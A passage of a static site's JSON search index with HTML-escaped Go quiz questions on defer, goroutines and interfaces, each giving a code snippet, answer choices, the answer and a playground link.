target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e29\n28\n28\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/zkp1U4vSmqO\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e2\n1\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer4\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eelem\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrint\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eelem\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ett\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ett\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ett\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eA. 132\u003c/li\u003e\n\u003cli\u003eB. 123\u003c/li\u003e\n\u003cli\u003eC. 312\u003c/li\u003e\n\u003cli\u003eD. 321\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Y1rR4UK8AOh\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eA\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Defer"},{"categories":null,"contents":" goroutine package main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { ch1 := make(chan int) go fmt.Println(\u0026lt;-ch1) ch1 \u0026lt;- 5 time.Sleep(1 * time.Second) } A. 5 B. deadlock C. compilation error Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/goroutine/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egoroutine\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSleep\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 5\u003c/li\u003e\n\u003cli\u003eB. deadlock\u003c/li\u003e\n\u003cli\u003eC. compilation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/FsQsswPtOpp\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Goroutine"},{"categories":null,"contents":" interface package main import ( \u0026#34;fmt\u0026#34; ) type People interface { Show() } type Student struct{} func (stu *Student) Show() {} func live() People { var stu *Student return stu } func main() { if live() == nil { fmt.Println(\u0026#34;AAAAAAA\u0026#34;) } else { fmt.Println(\u0026#34;BBBBBBB\u0026#34;) } } Answer Try it BBBBBBB interface1 package main import ( \u0026#34;fmt\u0026#34; ) type People interface { Speak(string) string } type Student struct{} func (stu *Student) Speak(think string) (talk string) { if think == \u0026#34;love\u0026#34; { talk = \u0026#34;You are a good boy\u0026#34; } else { talk = \u0026#34;hi\u0026#34; } return } func main() { var peo People = Student{} think := \u0026#34;love\u0026#34; fmt.Println(peo.Speak(think)) } Answer Try it compilation error cannot use Student{} (value of type Student) as People value in variable declaration: Student does not implement People (method Speak has pointer receiver) interface2 package main import \u0026#34;fmt\u0026#34; type T1 struct { String func() string } func (T1) Error() string { return \u0026#34;T1.Error\u0026#34; } type T2 struct { Error func() string } func (T2) String() string { return \u0026#34;T2.String\u0026#34; } var t1 = T1{String: func() string { return \u0026#34;T1.String\u0026#34; }} var t2 = T2{Error: func() string { return \u0026#34;T2.Error\u0026#34; }} func main() { fmt.Println(t1.Error(), t1.String()) fmt.Println(t2.Error(), t2.String()) fmt.Println(t1, t2) } Answer Try it T1.Error T1.String T2.Error T2.String T1.Error T2.String interface3 package main import \u0026#34;fmt\u0026#34; func main() { var p [100]int var m interface{} = [...]int{99: 0} fmt.Println(p == m) } Answer Try it true ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/interface/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eShow\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eShow\u003c/span\u003e() {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elive\u003c/span\u003e() \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elive\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AAAAAAA\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;BBBBBBB\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/2nBU-dMwW6b\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eBBBBBBB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eSpeak\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eSpeak\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) (\u003cspan style=\"color:#a6e22e\"\u003etalk\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;love\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etalk\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;You are a good boy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etalk\u003c/span\u003e = \u003cspan 